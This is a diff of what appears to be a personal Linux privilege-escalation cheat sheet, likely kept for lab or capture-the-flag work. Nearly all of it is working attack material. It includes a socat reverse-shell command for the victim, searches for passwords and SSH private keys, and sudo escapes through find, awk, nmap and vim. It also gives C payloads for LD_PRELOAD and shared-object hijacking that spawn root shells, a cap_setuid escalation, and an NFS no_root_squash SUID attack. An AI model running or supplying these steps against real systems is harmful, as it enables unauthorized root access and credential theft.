@@ -1,35 +1,175 @@
 # Script for enumirate linux from inside
 https://github.com/rebootuser/LinEnum/
 
-# Update shell using Python
-python -c 'import pty; pty.spawn("/bin/bash")'
 
+########################################################################
+#################### Update shell using Python #########################
+########################################################################
 
-# Upgrade nc shell
-# --------------------------------------------------------------------- #
-# Using stty options
-## stty -a on kali, to know rows and columns number for step 3
-
-# 1) In reverse shell
     $ python -c 'import pty; pty.spawn("/bin/bash")'
-    Ctrl-Z
+    $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-# 2) In Kali
-    $ stty raw -echo
-    $ fg
 
-# 3) In reverse shell
-    $ reset
-    $ export SHELL=bash
-    $ export TERM=xterm-256color
-    $ stty rows <num> columns <cols>
+########################################################################
+################# Upgrade shell with stty options ######################
+########################################################################
 
-# --------------------------------------------------------------------- #
-# Using socat
-# Listener:
-    socat file:`tty`,raw,echo=0 tcp-listen:<port>
+    # stty -a on kali, to know rows and columns number for step 3
 
-#Victim:
-    $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listener_ip>:<port>
+    # 1) In reverse shell
+        $ python -c 'import pty; pty.spawn("/bin/bash")'
+        Ctrl-Z
 
-# --------------------------------------------------------------------- #
+    # 2) In Kali
+        $ stty raw -echo
+        $ fg
+
+    # 3) In reverse shell
+        $ reset
+        $ export SHELL=bash
+        $ export TERM=xterm-256color
+        $ stty rows <num> columns <cols>
+
+########################################################################
+#################### Upgrade shell with socat ##########################
+########################################################################
+
+    # Listener:
+        socat file:`tty`,raw,echo=0 tcp-listen:<port>
+
+    #Victim:
+        $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listener_ip>:<port>
+
+
+########################################################################
+##################### Finding sensitive data ###########################
+########################################################################
+
+    $ cat ~/.bash_history | grep -i passw
+
+    $ find / -name authorized_keys 2> /dev/null
+    $ find / -name id_rsa 2> /dev/null
+
+########################################################################
+################## Exploiting SUDO Permissions #########################
+########################################################################
+
+    In command prompt run: sudo -l
+
+    Exploitation
+
+        $ sudo find /bin -name nano -exec /bin/sh \;
+        $ sudo awk 'BEGIN {system("/bin/sh")}'
+        $ echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
+        $ sudo vim -c '!sh'
+
+
+    Read sensetive files with apache2
+
+        $ sudo apache2 -f /etc/shadow
+
+
+########################################################################
+############ Exploiting SUDO Permissions with LD_PRELOAD ###############
+########################################################################
+
+    1. In command prompt type: sudo -l
+    2. From the output, notice that the LD_PRELOAD environment variable is intact.
+
+    Exploitation
+
+    1. Open a text editor and type:
+
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <stdlib.h>
+
+    void _init() {
+        unsetenv("LD_PRELOAD");
+        setgid(0);
+        setuid(0);
+        system("/bin/bash");
+    }
+
+    2. Save the file as x.c
+    3. In command prompt type:
+    gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
+    4. In command prompt type:
+    sudo LD_PRELOAD=/tmp/x.so apache2
+
+
+########################################################################
+############ Exploiting SUDO Permissions with LD_PRELOAD ###############
+########################################################################
+
+Detection
+
+    1. In command prompt type:
+        $ find / -type f -perm -04000 -ls 2>/dev/null
+    2. From the output, make note of all the SUID binaries.
+    3. In command line type:
+        $ strace <suid_bit_bin> 2>&1 | grep -i -E "open|access|no such
+        file"
+    4. From the output, notice that a .so file is <missed_binary> from a writable directory.
+
+Exploitation
+
+    1. Change dir to writable directory
+    2. Open a text editor and type:
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+
+    3. Save the file as <missed_binary>.c
+    4. In command prompt type:
+    gcc -shared -o <missed_binary> -fPIC <missed_binary>.c
+    5. Run <suid_bit_bin>
+    6. Success!!!
+
+########################################################################
+################### Exploiting with capabilities #######################
+########################################################################
+
+# Find capabilities
+    $ getcap -r / 2>/dev/null
+
+    !!! From the output, notice the value of the “cap_setuid” capability.
+
+# Exploitation example
+
+    1. In command prompt type:
+    /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+    2. Enjoy root!
+
+
+########################################################################
+################ Exploiting with NFS config errors #####################
+########################################################################
+
+Detection
+On exploiting machine:
+
+    $ cat /etc/exports
+
+!!! From the output, notice that “no_root_squash” option is defined for the
+<export_dir> export.
+
+Exploitation
+Attacker
+
+    # showmount -e 10.10.176.40
+    # mkdir <export_dir>/1
+    # mount -o rw,vers=2 10.10.176.40:/tmp /tmp/1
+    # echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
+    # gcc /tmp/1/x.c -o /tmp/1/x
+    # chmod +s /tmp/1/x
+
+On exploiting machine:
+    $ /tmp/x
+    $ id
